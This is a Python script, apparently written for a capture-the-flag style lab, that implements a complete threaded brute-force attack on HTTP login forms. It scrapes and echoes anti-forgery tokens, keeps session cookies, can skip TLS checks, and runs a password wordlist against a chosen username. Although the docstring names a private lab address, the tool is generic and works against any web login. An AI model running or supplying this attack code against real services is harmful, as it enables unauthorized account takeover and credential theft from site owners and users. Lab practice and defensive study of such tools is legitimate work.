#!/usr/bin/env python3
"""
brute.py - Threaded HTTP POST login brute-forcer (standard library only).

Written for the lab challenge:
    "04 - Brute Force: Staff Portal"
    Target: http://10.15.0.238:9004/   (username: admin, password in a wordlist)

Why this exists: `hydra` may not be installed on the box you attack from.
This script has ZERO third-party dependencies (no `requests`), so it runs on
a bare Python 3 interpreter. It also handles the two things hydra's simple
`http-post-form` mode struggles with:
    * a hidden CSRF / anti-forgery token read from the login page and echoed
      back in the POST body, and
    * Set-Cookie session cookies carried across requests.

Detection model (same idea as hydra's F= / S=):
    --fail    substring appearing ONLY in a FAILED login response
              -> a response WITHOUT it is a HIT.
    --success optional substring appearing ONLY in a SUCCESSFUL response.
              If given, it takes priority for confirming a hit.

Exit codes: 0 = password found, 1 = not found, 2 = fatal error.

Example (matches the lab):
    python3 brute.py \
        --url        http://10.15.0.238:9004/login \
        --login-page http://10.15.0.238:9004/ \
        --username   admin \
        --user-field username \
        --pass-field password \
        --wordlist   rockyou.txt \
        --fail       "Invalid" \
        --threads    20
"""

import argparse
import http.cookiejar
import queue
import re
import ssl
import sys
import threading
import time
import urllib.error
import urllib.parse
import urllib.request

_print_lock = threading.Lock()


def log(msg):
    with _print_lock:
        sys.stderr.write(msg + "\n")
        sys.stderr.flush()


def build_opener(insecure):
    """One cookie-aware opener per thread (cookie jars are not thread-safe)."""
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(
        urllib.request.HTTPCookieProcessor(jar),
        urllib.request.HTTPSHandler(context=ctx),
    )


def fetch_login_page(opener, url, timeout):
    """GET the login page: primes the session cookie, returns (html, headers)."""
    req = urllib.request.Request(
        url,
        headers={"User-Agent": "Mozilla/5.0 (brute.py)",
                 "Accept": "text/html,application/xhtml+xml"},
    )
    with opener.open(req, timeout=timeout) as resp:
        body = resp.read().decode("utf-8", "replace")
        headers = dict(resp.headers)
    return body, headers


def extract_csrf(html, field_names):
    """Return (name, value) of the first CSRF-looking hidden input, or None."""
    if not html:
        return None
    for name in field_names:
        for pat in (
            r"<input[^>]*name=[\"']%s[\"'][^>]*value=[\"']([^\"']*)[\"']",
            r"<input[^>]*value=[\"']([^\"']*)[\"'][^>]*name=[\"']%s[\"']",
        ):
            m = re.search(pat % re.escape(name), html, re.IGNORECASE)
            if m:
                return name, m.group(1)
    return None


class Brute(object):
    def __init__(self, args):
        self.args = args
        self.found = None
        self.lock = threading.Lock()
        self.stop = threading.Event()
        self.tried = 0
        self.start = time.time()
        self.csrf_name = None
        self.csrf_value = None

    def attempt(self, password):
        a = self.args
        opener = build_opener(a.insecure)
        data = {a.user_field: a.username, a.pass_field: password}
        if self.csrf_name and self.csrf_value is not None:
            data[self.csrf_name] = self.csrf_value
        for kv in (a.extra or []):
            if "=" in kv:
                k, v = kv.split("=", 1)
                data[k] = v
        payload = urllib.parse.urlencode(data).encode()
        req = urllib.request.Request(
            a.url, data=payload, method="POST",
            headers={"User-Agent": "Mozilla/5.0 (brute.py)",
                     "Content-Type": "application/x-www-form-urlencoded",
                     "Accept": "text/html,application/xhtml+xml"},
        )
        try:
            with opener.open(req, timeout=a.timeout) as resp:
                body = resp.read().decode("utf-8", "replace")
                status, length = resp.getcode(), len(body)
        except urllib.error.HTTPError as e:
            body = e.read().decode("utf-8", "replace")
            status, length = e.code, len(body)
        except Exception as e:            # network hiccup -> miss, keep going
            return ("error", str(e))

        if a.success:
            hit = a.success in body
        else:
            hit = (a.fail not in body) if a.fail else False

        if hit and (a.success or a.fail):
            if a.success and a.success in body:
                i = body.find(a.success)
                snippet = body[i:i + 120].replace("\n", " ").strip()
            else:
                snippet = body[:200].replace("\n", " ").strip()
            return ("hit", (password, status, length, snippet))
        return ("miss", (password, status, length))

    def worker(self, q):
        while not self.stop.is_set():
            try:
                pw = q.get_nowait()
            except queue.Empty:
                return
            try:
                kind, info = self.attempt(pw)
            finally:
                q.task_done()
            with self.lock:
                self.tried += 1
                n = self.tried
            if kind == "hit":
                with self.lock:
                    if self.found is None:
                        self.found = info
                        self.stop.set()
            if n % self.args.progress == 0:
                rate = n / max(time.time() - self.start, 1e-9)
                log("[*] tried %d  (%.1f/s)  last=%r" % (n, rate, pw))

    def run(self, wordlist):
        a = self.args
        try:
            html, _ = fetch_login_page(build_opener(a.insecure), a.login_page, a.timeout)
            fields = a.csrf_field or ["csrf", "csrf_token", "csrfmiddlewaretoken",
                                      "_token", "token", "authenticity_token"]
            got = extract_csrf(html, fields)
            if got:
                self.csrf_name, self.csrf_value = got
                log("[*] CSRF token detected: %s=%s" % got)
            else:
                log("[*] no CSRF token in login page (proceeding without)")
        except Exception as e:
            log("[!] could not GET login page (%s); continuing anyway" % e)

        q = queue.Queue()
        count = 0
        with open(wordlist, "r", encoding="utf-8", errors="replace") as fh:
            for line in fh:
                pw = line.rstrip("\r\n")
                if pw == "" and a.skip_blank:
                    continue
                q.put(pw)
                count += 1
        log("[*] loaded %d candidates; starting %d threads" % (count, a.threads))

        threads = [threading.Thread(target=self.worker, args=(q,), daemon=True)
                   for _ in range(a.threads)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        log("[*] done: %d attempts in %.1fs" % (self.tried, time.time() - self.start))
        return self.found


def parse_args(argv):
    p = argparse.ArgumentParser(description="Threaded HTTP POST login brute-forcer")
    p.add_argument("--url", required=True, help="POST endpoint (form action)")
    p.add_argument("--login-page", default=None,
                   help="GET page used to prime cookies/CSRF (default: --url)")
    p.add_argument("--username", default="admin")
    p.add_argument("--user-field", default="username")
    p.add_argument("--pass-field", default="password")
    p.add_argument("--wordlist", required=True)
    p.add_argument("--fail", default=None,
                   help="substring present ONLY on failed logins (hydra F=)")
    p.add_argument("--success", default=None,
                   help="substring present ONLY on success (hydra S=)")
    p.add_argument("--csrf-field", action="append", default=None,
                   help="hidden token field name(s) to look for")
    p.add_argument("--extra", action="append", default=None,
                   help="extra fixed form fields, key=value (repeatable)")
    p.add_argument("--threads", type=int, default=20)
    p.add_argument("--timeout", type=float, default=10.0)
    p.add_argument("--progress", type=int, default=200,
                   help="print progress every N attempts")
    p.add_argument("--skip-blank", action="store_true", default=True)
    p.add_argument("--insecure", action="store_true", help="skip TLS verification")
    a = p.parse_args(argv)
    if a.login_page is None:
        a.login_page = a.url
    return a


def main(argv=None):
    args = parse_args(argv if argv is not None else sys.argv[1:])
    if not args.fail and not args.success:
        log("[!] WARNING: neither --fail nor --success given; every response is a miss.")
    b = Brute(args)
    try:
        found = b.run(args.wordlist)
    except FileNotFoundError:
        log("[!] wordlist not found: %s" % args.wordlist)
        return 2
    except KeyboardInterrupt:
        log("[!] interrupted")
        return 2
    if found:
        pw, status, length, snippet = found
        print("[+] PASSWORD FOUND: %s" % pw)
        print("[+] login succeeded (HTTP %s, %d bytes)" % (status, length))
        if snippet:
            print("[+] evidence: %s" % snippet)
        return 0
    print("[-] no valid password found in wordlist")
    return 1


if __name__ == "__main__":
    sys.exit(main())
